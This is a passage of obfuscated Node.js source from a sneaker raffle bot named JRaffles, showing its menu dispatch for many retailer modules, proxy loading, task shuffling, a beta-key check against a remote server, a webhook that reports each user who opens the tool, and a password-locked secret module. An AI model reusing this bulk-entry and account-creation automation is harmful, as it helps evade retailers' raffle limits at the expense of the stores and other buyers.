    await _0x3ed2a9(_0x3b3c4d);
    if (_0x5cc6d1 === ![])
        return console['log']('Closing\x20Browser'), await _0xb9a1a7(0xbb8);
    else
        try {
            var _0x405fd9 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x1544fc
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x539abe
                    }
                ]
            }];
            const _0x5f0172 = { 'embeds': _0x405fd9 };
            var _0xa11f98 = await _0x530ba6(null, null, 'open', ![]);
            const _0x43152e = { 'openDEVMSG': { 'embeds': [_0xa11f98] } };
            await _0x313aa7(_0x5b8bb9, _0x43152e['openDEVMSG']);
            async function _0x2d7163() {
                _0x5bbc27('JRaffles\x20' + _0x539abe), console['clear'](), console['log']('Hello\x20' + _0x5631d3['cyan']('' + _0x1544fc) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x539abe), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x1d491b = 0x0; _0x1d491b < _0x2a4370['length'] - 0x4; _0x1d491b++) {
                    if (_0x1d491b >= 0xa) {
                        console['log']('\x20(' + _0x1d491b + ')\x20[' + _0x2a4370[_0x1d491b]['name'] + ']');
                        continue;
                    }
                    if (_0x2a4370[_0x1d491b]['name'] === 'Reload\x20Settings' || _0x2a4370[_0x1d491b]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x1d491b + ')\x20\x20[' + _0x2a4370[_0x1d491b]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x2a4370['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x2a4370['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x2a4370['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x2a4370['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x5855d4();
                if (taskModule > _0x2a4370['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0xb9a1a7(0x3e8), _0x2d7163();
                if (_0x2a4370[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x2b3489(_0x2a4370[taskModule]['modules']);
                    var _0x32df65 = _0x2a4370[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x4eb1a3 = await _0x1c7322();
                            await _0x32df65['function'](_0x32df65, _0x4eb1a3);
                        }
                        if (taskFunction == 0x2) {
                            var _0x4eb1a3 = await _0x1c7322(), _0x48eacc = _0xf38118['readFileSync']('pr.txt', 'utf-8')['split']('\x0a');
                            _0x4eb1a3 = _0x48eacc['map']((_0xd0aa62, _0x1419ec) => {
                                sanatizeProxy = _0xd0aa62['replace']('\x0d', '');
                                if (_0x48eacc[_0x1419ec + 0x1] != undefined)
                                    return '' + sanatizeProxy;
                                return '' + sanatizeProxy;
                            });
                            var _0x276558 = await _0x1487ec(_0x32df65);
                            _0x4a50c2['shuffleTasks'] && await _0x17e166(_0x276558), await _0x32df65['function'](_0x32df65, _0x276558, _0x4eb1a3);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x4eb1a3 = await _0x1c7322(), _0x276558 = await _0x1487ec(_0x32df65);
                                _0x4a50c2['shuffleTasks'] && await _0x17e166(_0x276558), await _0x32df65['function'](_0x32df65, _0x276558, _0x4eb1a3);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x4eb1a3 = await _0x1c7322();
                                    await _0x32df65['function'](_0x32df65, _0x4eb1a3);
                                }
                            }
                        }
                    } catch (_0x371f0f) {
                        console['log'](_0x371f0f), await _0xb9a1a7(0x7d0);
                    }
                    return _0x2d7163();
                }
                if (_0x2a4370[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x2b3489(_0x2a4370[taskModule]['modules']);
                        var _0x32df65 = _0x2a4370[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x4eb1a3 = await _0x1c7322(), _0x5ae340 = await _0x1487ec(_0x32df65);
                            _0x4a50c2['shuffleTasks'] && await _0x17e166(_0x5ae340), await _0x32df65['function'](_0x32df65, _0x5ae340, _0x4eb1a3);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x4eb1a3 = await _0x1c7322(), _0x5ae340 = await _0x1487ec(_0x32df65);
                                _0x4a50c2['shuffleTasks'] && await _0x17e166(_0x5ae340), await _0x32df65['function'](_0x32df65, _0x5ae340, _0x4eb1a3);
                            }
                        }
                    } catch (_0x13c7c5) {
                        console['log'](_0x13c7c5), await _0xb9a1a7(0xfa0);
                    }
                    return _0x2d7163();
                }
                if (_0x2a4370[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x2b3489(_0x2a4370[taskModule]['modules']);
                        var _0x32df65 = _0x2a4370[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x4eb1a3 = await _0x1c7322(), _0x5ae340 = await _0x1487ec(_0x32df65);
                            _0x4a50c2['shuffleTasks'] && await _0x17e166(_0x5ae340), await _0x32df65['function'](_0x32df65, _0x5ae340, _0x4eb1a3);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x4eb1a3 = await _0x1c7322(), _0x5ae340 = await _0x1487ec(_0x32df65);
                                _0x4a50c2['shuffleTasks'] && await _0x17e166(_0x5ae340), await _0x32df65['function'](_0x32df65, _0x5ae340, _0x4eb1a3);
                            }
                        }
                    } catch (_0x363e4e) {
                        console['log'](_0x363e4e), await _0xb9a1a7(0xfa0);
                    }
                    return _0x2d7163();
                }
                if (_0x2a4370[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x2b3489(_0x2a4370[taskModule]['modules']);
                    var _0x32df65 = _0x2a4370[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x4eb1a3 = await _0x1c7322();
                        return await _0x32df65['function'](_0x32df65, _0x4eb1a3), _0x2d7163();
                    }
                    var _0x4eb1a3 = await _0x1c7322(), _0x1ddd84 = await _0x1487ec(_0x32df65);
                    return _0x4a50c2['shuffleTasks'] && await _0x17e166(_0x1ddd84), await _0x32df65['function'](_0x32df65, _0x1ddd84, _0x4eb1a3), _0x2d7163();
                }
                if (_0x2a4370[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x2b3489(_0x2a4370[taskModule]['modules']);
                    var _0x32df65 = _0x2a4370[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x4eb1a3 = await _0x1c7322(), _0x1ddd84 = await _0x1487ec(_0x32df65);
                    return _0x4a50c2['shuffleTasks'] && await _0x17e166(_0x1ddd84), await _0x32df65['function'](_0x32df65, _0x1ddd84, _0x4eb1a3), _0x2d7163();
                }
                if (_0x2a4370[taskModule]['name'] == 'AFEW\x20Store' || _0x2a4370[taskModule]['name']['includes']('BACKDOOR')) {
                    taskFunction = await _0x2b3489(_0x2a4370[taskModule]['modules']);
                    var _0x32df65 = _0x2a4370[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x4eb1a3 = await _0x1c7322(), _0x1ddd84 = await _0x1487ec(_0x32df65);
                    return _0x4a50c2['shuffleTasks'] && await _0x17e166(_0x1ddd84), await _0x32df65['function'](_0x32df65, _0x1ddd84, _0x4eb1a3), _0x2d7163();
                }
                if (_0x2a4370[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x2b3489(_0x2a4370[taskModule]['modules']);
                    var _0x32df65 = _0x2a4370[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x4eb1a3 = await _0x1c7322(), _0x1ddd84 = await _0x1487ec(_0x32df65);
                    return _0x4a50c2['shuffleTasks'] && await _0x17e166(_0x1ddd84), await _0x32df65['function'](_0x32df65, _0x1ddd84, _0x4eb1a3), _0x2d7163();
                } else {
                    if (_0x2a4370[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x2b3489(_0x2a4370[taskModule]['modules']);
                        var _0x32df65 = _0x2a4370[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x4eb1a3 = await _0x1c7322(), _0x3d500a = await _0x1487ec(_0x32df65);
                            return _0x4a50c2['shuffleTasks'] && await _0x17e166(_0x3d500a), await _0x32df65['function'](_0x32df65, _0x3d500a, _0x4eb1a3), _0x2d7163();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x4eb1a3 = await _0x1c7322();
                                return await _0x32df65['function'](_0x32df65, null, _0x4eb1a3), _0x2d7163();
                            }
                        }
                        ;
                    } else {
                        if (_0x2a4370[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x2b3489(_0x2a4370[taskModule]['modules']);
                            var _0x32df65 = _0x2a4370[taskModule]['modules'][taskFunction], _0x4eb1a3 = await _0x1c7322(), _0x9f5e53 = await _0x1487ec(_0x32df65);
                            return _0x4a50c2['shuffleTasks'] && await _0x17e166(_0x9f5e53), await _0x32df65['function'](_0x32df65, _0x9f5e53, _0x4eb1a3), await _0xb9a1a7(0x1388), _0x2d7163();
                        } else {
                            if (_0x2a4370[taskModule]['name'] == 'Google\x20Forms') {
                                try {
                                    let _0x574c97 = { 'headers': { 'content-type': 'application/json' } }, _0x222eed = { 'key': _0x3b3c4d }, _0x509d57 = await _0x358674['post']('https://jraffles.herokuapp.com/beta', _0x222eed, _0x574c97);
                                    if (_0x509d57['status'] != 0xc8)
                                        throw new Error('No\x20Beta\x20Access..');
                                    console['log']('Hello,\x20' + _0x5631d3['cyan'](_0x1544fc) + '.\x20Beta\x20Access\x20Granted.'), await _0xb9a1a7(0x3e8);
                                } catch (_0x15afea) {
                                    return console['log']('No\x20Beta\x20Access.'), await _0xb9a1a7(0x7d0), _0x2d7163();
                                }
                                taskFunction = await _0x2b3489(_0x2a4370[taskModule]['modules']);
                                var _0x32df65 = _0x2a4370[taskModule]['modules'][taskFunction], _0x4eb1a3 = await _0x1c7322(), _0x9f5e53 = await _0x1487ec(_0x32df65);
                                return _0x4a50c2['shuffleTasks'] && await _0x17e166(_0x9f5e53), await _0x32df65['function'](_0x32df65, _0x9f5e53, _0x4eb1a3), await _0xb9a1a7(0x1388), _0x2d7163();
                            } else {
                                if (_0x2a4370[taskModule]['name'] == 'OQIUM\x20Store') {
                                    taskFunction = await _0x2b3489(_0x2a4370[taskModule]['modules']);
                                    var _0x32df65 = _0x2a4370[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0) {
                                        var _0x4eb1a3 = await _0x1c7322(), _0x3d500a = await _0x1487ec(_0x32df65);
                                        return _0x4a50c2['shuffleTasks'] && await _0x17e166(_0x3d500a), await _0x32df65['function'](_0x32df65, _0x3d500a, _0x4eb1a3), _0x2d7163();
                                    } else {
                                        if (taskFunction == 0x1) {
                                            var _0x4eb1a3 = await _0x1c7322();
                                            return await _0x32df65['function'](_0x32df65, null, _0x4eb1a3), _0x2d7163();
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x2a4370[taskModule]['name'] == 'BOUNCEWEAR') {
                                        taskFunction = await _0x2b3489(_0x2a4370[taskModule]['modules']);
                                        var _0x32df65 = _0x2a4370[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0)
                                            await bwAcc('https://bouncewear.com/nl/account/register', _0x32df65);
                                        else {
                                            if (taskFunction == 0x1) {
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x2a4370[taskModule]['name'] == 'PATTA') {
                                            taskFunction = await _0x2b3489(_0x2a4370[taskModule]['modules']);
                                            var _0x32df65 = _0x2a4370[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x4eb1a3 = await _0x1c7322(), _0x45c834 = await _0x1487ec(_0x32df65);
                                                return _0x4a50c2['shuffleTasks'] && await _0x17e166(_0x45c834), await _0x32df65['function'](_0x32df65, _0x45c834, _0x4eb1a3), _0x2d7163();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x4eb1a3 = await _0x1c7322(), _0x45c834 = await _0x1487ec(_0x32df65);
                                                    return _0x4a50c2['shuffleTasks'] && await _0x17e166(_0x45c834), await _0x32df65['function'](_0x32df65, _0x45c834, _0x4eb1a3), _0x2d7163();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x2a4370[taskModule]['name'] == 'SLAM\x20JAM') {
                                                taskFunction = await _0x2b3489(_0x2a4370[taskModule]['modules']);
                                                var _0x32df65 = _0x2a4370[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x4eb1a3 = await _0x1c7322(), _0x524b8d = await _0x1487ec(_0x32df65);
                                                    return _0x4a50c2['shuffleTasks'] && await _0x17e166(_0x524b8d), await _0x32df65['function'](_0x32df65, _0x524b8d, _0x4eb1a3), _0x2d7163();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x4eb1a3 = await _0x1c7322(), _0x524b8d = await _0x1487ec(_0x32df65);
                                                        return _0x4a50c2['shuffleTasks'] && await _0x17e166(_0x524b8d), await _0x32df65['function'](_0x32df65, _0x524b8d, _0x4eb1a3), _0x2d7163();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x2a4370[taskModule]['name'] == 'KICKZ') {
                                                    taskFunction = await _0x2b3489(_0x2a4370[taskModule]['modules']);
                                                    var _0x32df65 = _0x2a4370[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x4eb1a3 = await _0x1c7322(), _0x5be75a = await _0x1487ec(_0x32df65);
                                                        return _0x4a50c2['shuffleTasks'] && await _0x17e166(_0x5be75a), await _0x32df65['function'](_0x32df65, _0x5be75a, _0x4eb1a3), _0x2d7163();
                                                    } else {
                                                        if (taskFunction == 0x1) {
                                                            var _0x4eb1a3 = await _0x1c7322(), _0x5be75a = await _0x1487ec(_0x32df65);
                                                            return _0x4a50c2['shuffleTasks'] && await _0x17e166(_0x5be75a), await _0x32df65['function'](_0x32df65, _0x5be75a, _0x4eb1a3), _0x2d7163();
                                                        }
                                                    }
                                                    ;
                                                } else {
                                                    if (_0x2a4370[taskModule]['name'] == 'KICKZ') {
                                                        taskFunction = await _0x2b3489(_0x2a4370[taskModule]['modules']);
                                                        var _0x32df65 = _0x2a4370[taskModule]['modules'][taskFunction];
                                                        console['clear']();
                                                        if (taskFunction == 0x0) {
                                                            var _0x4eb1a3 = await _0x1c7322(), _0x5be75a = await _0x1487ec(_0x32df65);
                                                            return _0x4a50c2['shuffleTasks'] && await _0x17e166(_0x5be75a), await _0x32df65['function'](_0x32df65, _0x5be75a, _0x4eb1a3), _0x2d7163();
                                                        } else {
                                                            if (taskFunction == 0x1) {
                                                                var _0x4eb1a3 = await _0x1c7322(), _0x5be75a = await _0x1487ec(_0x32df65);
                                                                return _0x4a50c2['shuffleTasks'] && await _0x17e166(_0x5be75a), await _0x32df65['function'](_0x32df65, _0x5be75a, _0x4eb1a3), _0x2d7163();
                                                            }
                                                        }
                                                        ;
                                                    } else {
                                                        if (_0x2a4370[taskModule]['name'] == 'ADIDAS\x20CONFIRMED') {
                                                            taskFunction = await _0x2b3489(_0x2a4370[taskModule]['modules']);
                                                            var _0x32df65 = _0x2a4370[taskModule]['modules'][taskFunction];
                                                            console['clear']();
                                                            if (taskFunction == 0x0 || taskFunction == 0x1 || taskFunction == 0x2 || taskFunction == 0x3 || taskFunction == 0x4) {
                                                                var _0x4eb1a3 = await _0x1c7322(), _0x49bb19 = await _0x1487ec(_0x32df65);
                                                                return _0x4a50c2['shuffleTasks'] && await _0x17e166(_0x49bb19), await _0x32df65['function'](_0x49bb19, _0x4eb1a3), _0x2d7163();
                                                            }
                                                        } else {
                                                            if (_0x2a4370[taskModule]['name'] == 'Seven\x20Store')
                                                                return console['log']('returning\x20to\x20menu'), await _0xb9a1a7(0x3e8), _0x2d7163();
                                                            else {
                                                                if (_0x2a4370[taskModule]['name'] == 'Paypal\x20Verification') {
                                                                    var _0x4bc197 = _0x2a4370[taskModule]['name'], _0x4eb1a3 = await _0x1c7322();
                                                                    return await _0x34e8ed(_0x4bc197, _0x4eb1a3), _0x2d7163();
                                                                } else {
                                                                    if (_0x2a4370[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                        taskFunction = await _0x2b3489(_0x2a4370[taskModule]['modules']);
                                                                        var _0x32df65 = _0x2a4370[taskModule]['modules'][taskFunction];
                                                                        return await _0x32df65['function'](_0x32df65), _0x2d7163();
                                                                    } else {
                                                                        if (_0x2a4370[taskModule]['name'] == 'Change\x20Settings') {
                                                                            console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                            var _0xe2ced7 = 0x0;
                                                                            for (const _0x3772e6 in _0x4a50c2) {
                                                                                console['log']('(' + _0xe2ced7 + ')\x20' + _0x3772e6 + '\x20:\x20' + _0x4a50c2[_0x3772e6]), _0xe2ced7++;
                                                                            }
                                                                            console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0xe2ced7 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                            var _0x1bbc67 = await _0xb82327();
                                                                            if (_0x1bbc67 == _0xe2ced7)
                                                                                return _0x2d7163();
                                                                            console['clear'];
                                                                            var _0x1659e8 = 0x0;
                                                                            for (var _0xd04714 in _0x4a50c2) {
                                                                                if (_0x1bbc67 == _0x1659e8) {
                                                                                    console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0xd04714 + '\x20:'), _0x4a50c2[_0xd04714] = await _0x400118(), _0xf38118['writeFileSync']('../settings.json', JSON['stringify'](_0x4a50c2));
                                                                                    break;
                                                                                } else
                                                                                    _0x1659e8++;
                                                                            }
                                                                            return console['log']('Settings\x20Saved!'), await _0xb9a1a7(0xbb8), _0x2d7163();
                                                                        } else {
                                                                            if (_0x2a4370[taskModule]['name'] == 'Reload\x20Settings')
                                                                                return console['log']('Reloading\x20settings'), await _0x10b708(), _0x2d7163();
                                                                            else {
                                                                                if (taskModule == 0x45) {
                                                                                    _0x2a4370[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                                    var _0x53c4ee = await _0x5dfb41();
                                                                                    _0x53c4ee == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x3b122b(), await afewFunction(_0xe55f61[_0x1ca6dd], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0xb9a1a7(0xbb8));
                                                                                } else {
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x2d7163();
            } catch (_0x4affaa) {
                return console['log'](_0x4affaa), await _0xb9a1a7(0x2710), _0x2d7163();
            }
        } catch (_0x5cf459) {
            return console['log'](_0x5cf459), await _0xb9a1a7(0x3a98);
        }
}
;
_0x5bbc27('JRaffles\x20' + _0x539abe);
try {
    _0x10b708(), _0x466e4a();
} catch (_0x30ae57) {
    console['log'](_0x30ae57);
}